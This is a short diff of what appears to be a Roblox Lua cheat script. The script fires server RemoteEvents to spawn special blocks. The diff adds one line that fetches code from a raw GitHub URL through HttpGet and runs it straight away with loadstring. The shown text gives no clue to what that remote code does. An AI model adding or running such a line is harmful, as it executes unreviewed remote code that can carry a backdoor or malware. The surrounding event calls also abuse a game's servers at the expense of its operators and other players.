@@ -171,5 +171,5 @@ game:GetService("ReplicatedStorage").SpawnSuperBlock:FireServer()
 game:GetService("ReplicatedStorage").SpawnDiamondBlock:FireServer()
 game:GetService("ReplicatedStorage").SpawnRainbowBlock:FireServer()
 end
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Generallua/-/refs/heads/main/Get"))()
 end
